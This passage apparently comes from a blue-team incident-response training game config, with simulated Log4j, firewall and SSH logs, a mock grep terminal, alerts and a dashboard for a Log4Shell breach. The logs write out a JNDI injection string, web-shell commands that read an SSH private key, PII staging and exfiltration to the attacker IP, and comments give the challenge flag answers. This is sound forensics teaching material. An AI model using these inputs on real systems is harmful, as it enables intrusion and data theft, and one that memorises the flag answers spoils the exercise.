                                                '2026-05-08 07:08:14.502 WARN  [log4j2-lookup-thread-1] org.apache.logging.log4j.core.lookup.JndiLookup -- JNDI lookup initiated: ldap://203.0.113.66:1389/a (CVE-2021-44228)',
                                                '2026-05-08 07:08:14.614 ERROR [log4j2-lookup-thread-1] org.apache.logging.log4j.core.lookup.JndiLookup -- LDAP connection established to 203.0.113.66:1389 -- remote class loaded: com.sun.jndi.ldap.LdapCtx',
                                                '2026-05-08 07:08:14.801 ERROR [log4j2-lookup-thread-1] org.apache.logging.log4j.core.lookup.JndiLookup -- Remote codebase execution triggered via LDAP referral (RCE vector: CVE-2021-44228 CVSS 10.0)',
                                                // Application continues after RCE (attacker has shell as www-data / Tomcat user)
                                                '2026-05-08 07:08:41.882 INFO  [http-nio-8080-exec-12] com.veridian.app.web.UploadController -- File upload request from 203.0.113.66',
                                                '2026-05-08 07:08:41.990 INFO  [http-nio-8080-exec-12] com.veridian.app.web.UploadController -- Upload accepted: status.jsp stored to /var/www/app/uploads/',
                                                '2026-05-08 07:08:55.041 INFO  [http-nio-8080-exec-13] com.veridian.app.web.UploadController -- Uploaded file requested: /app/uploads/status.jsp (GET, cmd parameter present)',
                                                // Normal background after exploit
                                                '2026-05-08 07:10:00.001 INFO  [http-nio-8080-exec-14] com.veridian.app.web.DashboardController -- Dashboard rendered for user.id=100',
                                                '2026-05-08 07:12:44.118 INFO  [http-nio-8080-exec-15] com.veridian.app.web.HealthController -- Health check OK',
                                                '2026-05-08 07:20:08.441 INFO  [http-nio-8080-exec-16] com.veridian.app.web.LoginController -- Login page served to 10.10.1.102',
                                                '2026-05-08 07:25:01.002 INFO  [http-nio-8080-exec-17] com.veridian.app.web.HealthController -- Health check OK'
                                            ].join('\n')
                                        }
                                    }
                                },

                                // ── FIREWALL LOG ─────────────────────────────────────
                                // Contains:
                                //   - Normal background: HTTP/443 inbound, internal traffic
                                //   - Recon port scan: rapid SYN bursts from 203.0.113.66 to WEB-DMZ-01
                                //   - *** OUTBOUND LDAP: WEB-DMZ-01 -> 203.0.113.66:1389 (Log4Shell callback) ***
                                //     This is the missing egress control. DPT=1389 is the c2_port flag.
                                //   - Web shell POST (inbound HTTP from attacker)
                                //   - Lateral SSH FORWARD: WEB-DMZ-01 (10.10.10.20) -> APP-INT-05 (10.10.20.15)
                                //   - Normal outbound HTTPS (background noise near exfil time)
                                //   - *** EXFIL: APP-INT-05 -> 203.0.113.66 DPT=443 BYTES=4509715660 ***
                                //
                                // FLAG DISCOVERY:
                                //   c2_port        -> grep "1389" /var/log/firewall.log
                                //                     (outbound LDAP from 10.10.10.20 to 203.0.113.66:1389)
                                //   lateral_target -> grep "10.10.20.15" /var/log/firewall.log
                                //                     (FORWARD rule: 10.10.10.20 -> 10.10.20.15 DPT=22)
                                //                     also grep "svc-deploy" /var/log/auth.log
                                //   exfil_bytes    -> grep "BYTES=" /var/log/firewall.log
                                //                     or grep "203.0.113.66" /var/log/firewall.log
                                //                     look for the largest BYTES value
                                'firewall.log': {
                                    type: 'file',
                                    content: [
                                        // Normal background: inbound web traffic
                                        'May 08 06:30:02 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.100 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=54201 DPT=80 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 06:30:15 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.101 DST=10.10.10.20 LEN=52 PROTO=TCP SPT=54302 DPT=80 WINDOW=502 RES=0x00 ACK URGP=0',
                                        'May 08 06:31:14 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.5 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=52201 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 06:35:44 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.102 DST=10.10.10.20 LEN=52 PROTO=TCP SPT=58021 DPT=443 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 07:00:22 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.5 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=52388 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        // Recon: port scan SYN burst from attacker IP (rapid, multiple DPTs)
                                        'May 08 07:02:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49100 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        'May 08 07:02:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49101 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        'May 08 07:02:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49102 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        'May 08 07:02:02 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49103 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        'May 08 07:02:02 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49104 DPT=8443 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        'May 08 07:02:02 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=44 PROTO=TCP SPT=49105 DPT=3306 WINDOW=65535 RES=0x00 SYN URGP=0',
                                        // Log4Shell exploit inbound HTTP POST
                                        'May 08 07:08:14 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=1500 PROTO=TCP SPT=49200 DPT=80 WINDOW=65535 RES=0x00 ACK PSH URGP=0',
                                        // *** OUTBOUND LDAP -- THE MISSING EGRESS CONTROL ***
                                        // Log4Shell fires: WEB-DMZ-01 makes outbound LDAP connection to attacker port 1389.
                                        // An egress rule blocking port 1389 outbound from the DMZ would have stopped this.
                                        // DPT=1389 is the c2_port flag.
                                        'May 08 07:08:14 WEB-DMZ-01 kernel: IPTABLES ALLOW OUT: IN= OUT=eth0 SRC=10.10.10.20 DST=203.0.113.66 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=14401 DF PROTO=TCP SPT=41021 DPT=1389 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 07:08:14 WEB-DMZ-01 kernel: IPTABLES ALLOW OUT: IN= OUT=eth0 SRC=10.10.10.20 DST=203.0.113.66 LEN=52 PROTO=TCP SPT=41021 DPT=1389 WINDOW=502 RES=0x00 ACK URGP=0 BYTES=1840',
                                        // Web shell upload POST (inbound)
                                        'May 08 07:08:41 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=1500 PROTO=TCP SPT=49200 DPT=80 WINDOW=502 RES=0x00 ACK PSH URGP=0',
                                        // Web shell execution GETs (inbound -- repeated)
                                        'May 08 07:08:55 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=500 PROTO=TCP SPT=49200 DPT=80 WINDOW=502 RES=0x00 ACK PSH URGP=0',
                                        'May 08 07:09:02 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=500 PROTO=TCP SPT=49200 DPT=80 WINDOW=502 RES=0x00 ACK PSH URGP=0',
                                        'May 08 07:09:08 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=203.0.113.66 DST=10.10.10.20 LEN=500 PROTO=TCP SPT=49200 DPT=80 WINDOW=502 RES=0x00 ACK PSH URGP=0',
                                        // Normal background (noise around attack window)
                                        'May 08 07:10:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.100 DST=10.10.10.20 LEN=52 PROTO=TCP SPT=55001 DPT=80 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        // Lateral SSH FORWARD: WEB-DMZ-01 -> APP-INT-05
                                        // DPT=22 inbound from 10.10.10.20 to 10.10.20.15 (lateral movement)
                                        // This is the third place lateral_target appears (after auth.log)
                                        'May 08 07:43:11 WEB-DMZ-01 kernel: IPTABLES ALLOW FORWARD: IN=eth0 OUT=eth1 SRC=10.10.10.20 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=41892 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 07:43:11 WEB-DMZ-01 kernel: IPTABLES ALLOW FORWARD: IN=eth1 OUT=eth0 SRC=10.10.20.15 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=22 DPT=41892 WINDOW=65535 RES=0x00 SYN ACK URGP=0',
                                        // Normal outbound HTTPS (background noise near the exfil window)
                                        'May 08 07:50:14 WEB-DMZ-01 kernel: IPTABLES ALLOW OUT: IN= OUT=eth0 SRC=10.10.10.20 DST=151.101.1.140 LEN=52 PROTO=TCP SPT=44001 DPT=443 WINDOW=502 RES=0x00 ACK URGP=0 BYTES=4120',
                                        'May 08 08:00:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.100 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=55501 DPT=80 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        // *** EXFILTRATION ***
                                        // Attacker exfiltrates ~4.2 GB of customer PII from APP-INT-05
                                        // over HTTPS/443 to attacker C2. Both entries are FORWARD-chain records:
                                        // WEB-DMZ-01 is acting as a gateway (router) for APP-INT-05, so the
                                        // packet passes through the FORWARD chain, never the OUTPUT chain.
                                        // BYTES=4509715660 lives on the FORWARD entry -- technically correct.
                                        'May 08 08:14:22 WEB-DMZ-01 kernel: IPTABLES ALLOW FORWARD: IN=eth1 OUT=eth0 SRC=10.10.20.15 DST=203.0.113.66 LEN=1500 TOS=0x00 PREC=0x00 TTL=63 ID=48801 DF PROTO=TCP SPT=49270 DPT=443 WINDOW=502 RES=0x00 ACK PSH URGP=0',
                                        'May 08 08:15:44 WEB-DMZ-01 kernel: IPTABLES ALLOW FORWARD: IN=eth1 OUT=eth0 SRC=10.10.20.15 DST=203.0.113.66 LEN=1500 TOS=0x00 PREC=0x00 TTL=63 ID=48802 DF PROTO=TCP SPT=49270 DPT=443 WINDOW=502 RES=0x00 ACK FIN URGP=0 BYTES=4509715660',
                                        // Background continues post-exfil
                                        'May 08 08:30:01 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.100 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=56001 DPT=80 WINDOW=29200 RES=0x00 SYN URGP=0',
                                        'May 08 09:00:22 WEB-DMZ-01 kernel: IPTABLES ALLOW IN: IN=eth0 OUT= SRC=10.10.1.5 DST=10.10.10.20 LEN=60 PROTO=TCP SPT=52811 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0'
                                    ].join('\n')
                                }

                            } // end /var/log children
                        }
                    }
                },

                // /etc and /tmp exist so paths resolve cleanly
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'ir-ws-01' },
                        'hosts': {
                            type: 'file',
                            content: [
                                '127.0.0.1   localhost',
                                '10.10.10.20 WEB-DMZ-01',
                                '10.10.1.5   deploy-jump'
                            ].join('\n')
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} }

            } // end / children
        }
    },

    // =========================================================
    // TERMINAL COMMANDS (custom additions)
    //
    // grep: file-based AND pipe-aware (matches box #1 pattern exactly).
    // Terminal.js sets term._pipedStdin = <previous stdout> before
    // calling any custom command handler in a pipeline segment.
    // =========================================================

    commands: {

        // ── grep: file-based AND pipe-aware ────────────────────
        // Handles: grep PATTERN FILE           (direct file search)
        //          cat FILE | grep PATTERN     (piped stdin via term._pipedStdin)
        //          grep -i PATTERN FILE        (case-insensitive)
        //          grep -v PATTERN FILE        (invert match)
        //          grep -c PATTERN FILE        (count matches)
        //          grep -n PATTERN FILE        (show line numbers)
        'grep': function(args, term, engine) {
            if (!args.length) {
                return 'Usage: grep [OPTIONS] PATTERN FILE\n  -i  case-insensitive\n  -v  invert match (lines NOT matching)\n  -c  count matching lines\n  -n  show line numbers\n  -A N  print N lines after each match\n  -B N  print N lines before each match\n  -C N  print N lines before and after each match\n\nExample: grep PATTERN /var/log/app/log4j.log\nExample: grep -A 3 "PATTERN" /var/log/app/log4j.log\nExample: cat /var/log/firewall.log | grep PATTERN';
            }

            // ── Robust left-to-right argument parser ──────────────
            // Walks args in order so that -A/-B/-C consume their
            // numeric argument as N, preventing N from being
            // misassigned as the pattern or filename.
            var caseInsensitive = false;
            var invertMatch     = false;
            var countOnly       = false;
            var showLineNums    = false;
            var afterCtx        = 0;   // -A N
            var beforeCtx       = 0;   // -B N
            var pattern         = '';
            var filePath        = '';

            var i = 0;
            while (i < args.length) {
                var tok = args[i];
                // Context flags: exact token -A / -B / -C  (next token is N)
                if (tok === '-A' || tok === '-B' || tok === '-C') {
                    var n = parseInt(args[i + 1], 10);
                    if (!isNaN(n) && n >= 0) {
                        if (tok === '-A') { afterCtx  = n; }
                        else if (tok === '-B') { beforeCtx = n; }
                        else { afterCtx = n; beforeCtx = n; }
                        i += 2;
                    } else {
                        i++;  // N missing or invalid -- skip flag
                    }
                // Context flags with N attached: -A12 / -B3 / -C1
                } else if (/^-[ABC]\d+$/.test(tok)) {
                    var letter = tok[1];
                    var n = parseInt(tok.slice(2), 10);
                    if (letter === 'A') { afterCtx  = n; }
                    else if (letter === 'B') { beforeCtx = n; }
                    else { afterCtx = n; beforeCtx = n; }
                    i++;
                // Regular flags: any dash-token not matching -A/-B/-C pattern
                } else if (tok.startsWith('-')) {
                    if (tok.includes('i')) { caseInsensitive = true; }
                    if (tok.includes('v')) { invertMatch     = true; }
                    if (tok.includes('c')) { countOnly       = true; }
                    if (tok.includes('n')) { showLineNums    = true; }
                    i++;
                // Positional: first non-flag = pattern, second = file
                } else {
                    if (!pattern)       { pattern  = tok; }
                    else if (!filePath) { filePath = tok; }
                    i++;
                }
            }

            if (!pattern) return 'grep: missing pattern\nUsage: grep PATTERN FILE';

            var content;
            if (filePath) {
                var node = term._getNode(filePath);
                if (!node) return 'grep: ' + filePath + ': No such file or directory';
                if (node.type === 'dir') return 'grep: ' + filePath + ': Is a directory';
                content = node.content || '';
            } else if (term._pipedStdin) {
                content = term._pipedStdin;
            } else {
                return 'grep: missing file argument\nUsage: grep PATTERN FILE\n       cat FILE | grep PATTERN';
            }

            var lines = content.split('\n');

            var re;
            try {
                re = new RegExp(pattern, caseInsensitive ? 'i' : '');
            } catch (e) {
                return 'grep: invalid regular expression: ' + pattern;
            }

            // ── Match and apply -v filter ─────────────────────────
            var matchIndices = [];
            lines.forEach(function(line, idx) {
                var hits = re.test(line);
                var keep = invertMatch ? !hits : hits;
                if (keep) { matchIndices.push(idx); }
            });

            if (countOnly) return String(matchIndices.length);
            if (!matchIndices.length) return ''; // grep exits silently when no match

            // ── No context flags: simple output path ──────────────
            if (afterCtx === 0 && beforeCtx === 0) {
                return matchIndices.map(function(idx) {
                    return showLineNums ? (idx + 1) + ':' + lines[idx] : lines[idx];
                }).join('\n');
            }

            // ── Context output: build the set of line indices to print,
            //    track which are match lines vs context lines, and
            //    insert '--' separators between non-adjacent groups.
            // Each entry: { idx, isMatch }
            var included = [];  // ordered, deduped line entries
            var seenIdx  = {};  // index -> position in included[]

            matchIndices.forEach(function(midx) {
                var start = Math.max(0, midx - beforeCtx);
                var end   = Math.min(lines.length - 1, midx + afterCtx);
                for (var j = start; j <= end; j++) {
                    if (!seenIdx.hasOwnProperty(j)) {
                        seenIdx[j] = included.length;
                        included.push({ idx: j, isMatch: (j === midx) });
                    } else if (j === midx) {
                        // Already in the list -- mark it as a match line
                        included[seenIdx[j]].isMatch = true;
                    }
                }
            });

            // Sort by line index (they should already be ordered, but ensure it)
            included.sort(function(a, b) { return a.idx - b.idx; });

            // Build output with '--' separators between non-adjacent groups
            var output = [];
            for (var k = 0; k < included.length; k++) {
                if (k > 0 && included[k].idx !== included[k - 1].idx + 1) {
                    output.push('--');
                }
                var entry = included[k];
                var text  = lines[entry.idx];
                if (showLineNums) {
                    // GNU grep: match lines use ':', context lines use '-'
                    var sep = entry.isMatch ? ':' : '-';
                    output.push((entry.idx + 1) + sep + text);
                } else {
                    output.push(text);
                }
            }
            return output.join('\n');
        },

        // ── wc -l shorthand ───────────────────────────────────
        'wc': function(args, term) {
            var lineMode  = args.includes('-l');
            var wordMode  = args.includes('-w');
            var filePaths = args.filter(function(a) { return !a.startsWith('-'); });

            if (!filePaths.length) {
                // Piped input (e.g. grep PATTERN FILE | wc -l): no file arg, count term._pipedStdin
                if (term && term._pipedStdin) {
                    var _s = term._pipedStdin;
                    var _sl = _s === '' ? 0 : _s.replace(/\n+$/, '').split('\n').length;
                    var _sw = _s.split(/\s+/).filter(Boolean).length;
                    if (lineMode) return '  ' + _sl;
                    if (wordMode) return '  ' + _sw;
                    return '  ' + _sl + '  ' + _sw + '  ' + _s.length;
                }
                return 'Usage: wc [-l] [-w] FILE\nExample: wc -l /var/log/auth.log';
            }

            var results = [];
            filePaths.forEach(function(fp) {
                var node = term._getNode(fp);
                if (!node) { results.push('wc: ' + fp + ': No such file or directory'); return; }
                if (node.type === 'dir') { results.push('wc: ' + fp + ': Is a directory'); return; }
                var c = node.content || '';
                var lineCount = c.split('\n').length;
                var wordCount = c.split(/\s+/).filter(Boolean).length;
                if (lineMode) results.push('  ' + lineCount + ' ' + fp);
                else if (wordMode) results.push('  ' + wordCount + ' ' + fp);
                else results.push('  ' + lineCount + '  ' + wordCount + '  ' + c.length + ' ' + fp);
            });
            return results.join('\n');
        },

        // ── help override (case-specific command reference) ────
        'help': function(args, term) {
            return [
                'BREACH CAPSTONE -- COMMAND REFERENCE',
                '',
                'File inspection:',
                '  ls [PATH]               List directory contents',
                '  cat FILE                Display full file contents',
                '  head [-n N] FILE        First N lines (default 10)',
                '  tail [-n N] FILE        Last N lines (default 10)',
                '  find PATH [-name PAT]   Search for files',
                '',
                'Search and filter:',
                '  grep [-ivnc] PAT FILE   Search for pattern in file',
                '    -i  case-insensitive  -v  invert  -n  line nums  -c  count',
                '  wc -l FILE              Count lines in a file',
                '',
                'Navigation:',
                '  cd PATH                 Change directory',
                '  pwd                     Print working directory',
                '  clear                   Clear screen',
                '',
                'Key evidence locations:',
                '  /var/log/app/log4j.log            Java application log (Log4j output)',
                '  /var/log/apache2/access.log       Apache HTTP access requests',
                '  /var/log/apache2/error.log        Apache PHP/JSP server errors',
                '  /var/log/auth.log                 SSH, PAM, and service account events',
                '  /var/log/firewall.log             Perimeter firewall flow log',
                '  /home/analyst/case.txt            Case file and investigation guide',
                '',
                'Phase 1 (Detect) starting points:',
                '  Check Monitoring dashboard and IDS Panel first',
                '  grep "jndi" /var/log/app/log4j.log',
                '',
                'Phase 2 (Investigate) starting points:',
                '  grep "status.jsp" /var/log/apache2/access.log',
                '  grep "127.0.0.1" /var/log/auth.log',
                '',
                'Phase 3 (Contain) starting points:',
                '  grep "BYTES=" /var/log/firewall.log',
                '  grep "DPT=" /var/log/firewall.log'
            ].join('\n');
        }

    },

    // =========================================================
    // LOG VIEWER DATA (BlueTeam.js LogViewer device)
    //
    // Presents the most forensically relevant events with severity
    // classification. suspicious:true entries render highlighted.
    // Organized chronologically across all log sources.
    // =========================================================

    logViewer: {
        entries: [
            // ── Normal background ──────────────────────────────────
            { timestamp: '2026-05-08 06:30:00', severity: 'info',    source: 'app/log4j',      message: 'Veridian Customer Portal v4.2.1 starting -- Log4j 2.14.0 initialized' },
            { timestamp: '2026-05-08 06:30:02', severity: 'info',    source: 'firewall',       message: 'ALLOW IN: SRC=10.10.1.100 DST=10.10.10.20 DPT=80' },
            { timestamp: '2026-05-08 06:31:14', severity: 'info',    source: 'sshd',           message: 'Accepted publickey for svc-deploy from 10.10.1.5 port 52201 -- scheduled deploy' },
            { timestamp: '2026-05-08 06:35:58', severity: 'info',    source: 'app/log4j',      message: 'Successful authentication: user.id=102 from 10.10.1.102' },
            { timestamp: '2026-05-08 07:00:22', severity: 'info',    source: 'sshd',           message: 'Accepted publickey for svc-deploy from 10.10.1.5 port 52388 -- scheduled deploy' },
            // ── Recon ─────────────────────────────────────────────
            { timestamp: '2026-05-08 07:02:01', severity: 'warning', source: 'firewall',       message: 'ALLOW IN: SRC=203.0.113.66 DST=10.10.10.20 -- rapid SYN sweep across multiple ports', suspicious: true },
            { timestamp: '2026-05-08 07:02:41', severity: 'warning', source: 'app/log4j',      message: 'Login page served to 203.0.113.66 (unrecognized external IP)', suspicious: true },
            // ── Log4Shell exploit ─────────────────────────────────
            { timestamp: '2026-05-08 07:08:14', severity: 'crit',    source: 'app/log4j',      message: 'WARN: Suspicious User-Agent from 203.0.113.66: ${jndi:ldap://203.0.113.66:<port>/a} -- JNDI injection detected', suspicious: true },
            { timestamp: '2026-05-08 07:08:14', severity: 'crit',    source: 'app/log4j',      message: 'ERROR: JNDI lookup initiated to 203.0.113.66 on anomalous LDAP port (CVE-2021-44228) -- see log4j.log for full string', suspicious: true },
            { timestamp: '2026-05-08 07:08:14', severity: 'crit',    source: 'app/log4j',      message: 'ERROR: LDAP callback to 203.0.113.66 completed -- remote class loaded -- RCE via CVE-2021-44228', suspicious: true },
            { timestamp: '2026-05-08 07:08:14', severity: 'crit',    source: 'firewall',       message: 'ALLOW OUT: SRC=10.10.10.20 DST=203.0.113.66 on anomalous non-web port -- outbound LDAP callback (no egress block). Check firewall log DPT= for exact port.', suspicious: true },
            // ── Web shell ─────────────────────────────────────────
            { timestamp: '2026-05-08 07:08:41', severity: 'crit',    source: 'apache/access',  message: '203.0.113.66 -- "POST /app/upload HTTP/1.1" 200 284 -- file upload from attacker IP', suspicious: true },
            { timestamp: '2026-05-08 07:08:41', severity: 'crit',    source: 'apache/error',   message: 'JSP Notice: upload handler: file stored as /var/www/app/uploads/status.jsp', suspicious: true },
            { timestamp: '2026-05-08 07:08:55', severity: 'crit',    source: 'apache/access',  message: '203.0.113.66 -- "GET /app/uploads/status.jsp?cmd=id HTTP/1.1" 200 -- web shell executed', suspicious: true },
            { timestamp: '2026-05-08 07:09:40', severity: 'crit',    source: 'apache/access',  message: '203.0.113.66 -- "GET /app/uploads/status.jsp?cmd=cat+/home/svc-deploy/.ssh/id_rsa" 200', suspicious: true },
            // ── Lateral movement ──────────────────────────────────
            { timestamp: '2026-05-08 07:42:18', severity: 'crit',    source: 'sshd',           message: 'Accepted publickey for svc-deploy from 127.0.0.1 port 41100 -- ANOMALY: local loopback source', suspicious: true },
            { timestamp: '2026-05-08 07:42:35', severity: 'crit',    source: 'sudo',           message: 'svc-deploy ran: cat /etc/hosts -- enumeration via web-shell-controlled session', suspicious: true },
            { timestamp: '2026-05-08 07:43:11', severity: 'crit',    source: 'sshd',           message: 'APP-INT-05 sshd: Accepted publickey for svc-deploy from 10.10.10.20 port 41892 -- lateral SSH', suspicious: true },
            { timestamp: '2026-05-08 07:43:11', severity: 'crit',    source: 'firewall',       message: 'ALLOW FORWARD: SRC=10.10.10.20 DST=<internal-host> DPT=22 -- lateral SSH to internal subnet (no east-west block)', suspicious: true },
            { timestamp: '2026-05-08 07:43:55', severity: 'crit',    source: 'sudo',           message: 'APP-INT-05 svc-deploy: tar -czf /tmp/export.tar.gz /opt/app/data/customers/ -- staging PII', suspicious: true },
            // ── Exfiltration ──────────────────────────────────────
            { timestamp: '2026-05-08 08:14:22', severity: 'crit',    source: 'firewall',       message: 'ALLOW FORWARD: SRC=<internal-host> DST=203.0.113.66 DPT=443 -- anomalous outbound HTTPS from internal subnet via WEB-DMZ-01', suspicious: true },
            { timestamp: '2026-05-08 08:15:44', severity: 'crit',    source: 'firewall',       message: 'ALLOW FORWARD: SRC=<internal-host> DST=203.0.113.66 DPT=443 -- high-volume exfil transfer completed. Check firewall log BYTES= for exact scope.', suspicious: true },
            // ── Normal post-incident ───────────────────────────────
            { timestamp: '2026-05-08 09:00:22', severity: 'info',    source: 'sshd',           message: 'Accepted publickey for svc-deploy from 10.10.1.5 port 52811 -- scheduled deploy (resumed)' }
        ]
    },

    // =========================================================
    // MONITORING DASHBOARD DATA (BlueTeam.js MonitoringDashboard)
    //
    // Traffic histogram (5-min windows). Spikes mark:
    //   07:00 -- port scan recon (brief spike)
    //   07:05-07:15 -- exploit + web shell activity
    //   07:40-07:50 -- lateral movement SSH
    //   08:10-08:20 -- exfiltration (the biggest spike)
    // =========================================================

    monitoring: {

        // Network traffic histogram -- values are relative event counts
        traffic: [
            { value: 12,  label: '06:30' },
            { value: 14,  label: '06:35' },
            { value: 11,  label: '06:40' },
            { value: 9,   label: '06:45' },
            { value: 13,  label: '06:50' },
            { value: 10,  label: '06:55' },
            { value: 15,  label: '07:00' },
            { value: 48,  label: '07:05', threshold: 40 },   // recon scan + exploit
            { value: 62,  label: '07:10', threshold: 40 },   // web shell activity peak
            { value: 44,  label: '07:15', threshold: 40 },   // web shell enumeration
            { value: 18,  label: '07:20' },
            { value: 14,  label: '07:25' },
            { value: 11,  label: '07:30' },
            { value: 9,   label: '07:35' },
            { value: 13,  label: '07:40' },
            { value: 38,  label: '07:45', threshold: 40 },   // lateral SSH
            { value: 22,  label: '07:50' },
            { value: 16,  label: '07:55' },
            { value: 19,  label: '08:00' },
            { value: 14,  label: '08:05' },
            { value: 12,  label: '08:10' },
            { value: 187, label: '08:15', threshold: 40 },   // exfil -- massive spike
            { value: 142, label: '08:20', threshold: 40 },   // exfil continuing
            { value: 21,  label: '08:25' },
            { value: 14,  label: '08:30' },
            { value: 11,  label: '08:35' }
        ],

        // Event feed -- chronological timeline of what the monitoring console shows
        events: [
            { timestamp: '07:02:01', source: 'firewall',      message: 'Port scan detected: 203.0.113.66 rapid SYN sweep against WEB-DMZ-01 (10.10.10.20) across multiple ports' },
            { timestamp: '07:08:14', source: 'ids',           message: 'CRITICAL: Log4Shell exploit attempt -- JNDI LDAP callback from WEB-DMZ-01 to external IP on an anomalous non-web port' },
            { timestamp: '07:08:14', source: 'firewall',      message: 'Outbound connection: WEB-DMZ-01 (10.10.10.20) initiating outbound LDAP to 203.0.113.66 on a non-standard port -- check firewall log for DPT' },
            { timestamp: '07:08:41', source: 'apache',        message: 'File upload from 203.0.113.66 to web application followed by execution of uploaded file -- web shell suspected' },
            { timestamp: '07:08:55', source: 'apache',        message: 'Web shell executed: /app/uploads/status.jsp?cmd=id accessed by 203.0.113.66 with HTTP 200 response' },
            { timestamp: '07:42:18', source: 'sshd',          message: 'ANOMALY: SSH login for svc-deploy from 127.0.0.1 (loopback) -- process-initiated SSH from inside WEB-DMZ-01' },
            { timestamp: '07:43:11', source: 'sshd',          message: 'CRITICAL: Lateral SSH detected -- svc-deploy connected from WEB-DMZ-01 (10.10.10.20) to internal host on port 22' },
            { timestamp: '07:43:55', source: 'syslog',        message: 'CRITICAL: Staging activity on internal host -- large archive created from /opt/app/data/customers/ directory' },
            { timestamp: '08:14:22', source: 'firewall',      message: 'Large outbound HTTPS transfer detected: an internal host is sending a very high volume of data to 203.0.113.66 -- possible exfiltration in progress' },
            { timestamp: '08:15:44', source: 'firewall',      message: 'CRITICAL: Exfiltration confirmed -- multi-gigabyte transfer from an internal host to external attacker IP 203.0.113.66 via HTTPS/443. Check firewall log BYTES= field for exact scope.' }
        ],

        // Alert panel -- what fired at the monitoring console
        alerts: [
            { name: 'RECON-PORT-SCAN',              severity: 'medium',   sourceIP: '203.0.113.66', description: 'Rapid SYN sweep from external IP 203.0.113.66 against WEB-DMZ-01 (10.10.10.20) across multiple port targets. Consistent with Nmap host/service discovery. Not in approved source list.' },
            { name: 'LOG4SHELL-JNDI-ATTEMPT',       severity: 'critical', sourceIP: '203.0.113.66', description: 'IDS: JNDI expression detected in HTTP request User-Agent header from 203.0.113.66. Pattern matches Log4Shell (CVE-2021-44228). Java application on WEB-DMZ-01 is a confirmed target.' },
            { name: 'DMZ-OUTBOUND-NON-WEB-PORT',    severity: 'high',     sourceIP: '10.10.10.20',  description: 'WEB-DMZ-01 (10.10.10.20) initiated an outbound TCP connection on a non-web port to an external address. DMZ hosts should not initiate outbound connections on non-standard ports. Investigate application logs.' },
            { name: 'WEB-SHELL-UPLOAD-EXECUTE',     severity: 'critical', sourceIP: '203.0.113.66', description: 'File uploaded to /app/upload by attacker IP then immediately requested with a command parameter. Web shell deployment confirmed. Host WEB-DMZ-01 is actively compromised.' },
            { name: 'ANOMALOUS-INTERNAL-SSH-PIVOT', severity: 'critical', sourceIP: '10.10.10.20',  description: 'SSH connection from WEB-DMZ-01 (10.10.10.20) to an internal host. Application servers in DMZ have no legitimate need to initiate SSH to internal hosts. Lateral movement in progress.' },
            { name: 'LARGE-OUTBOUND-TRANSFER',      severity: 'critical', sourceIP: '10.10.10.20',  description: 'Anomalous high-volume outbound HTTPS transfer routed via WEB-DMZ-01 to external IP 203.0.113.66. Origin is an internal host. Volume indicates possible exfiltration of customer data. Investigate firewall log for FORWARD entries and exact byte count.' }
        ]
    },

    // =========================================================
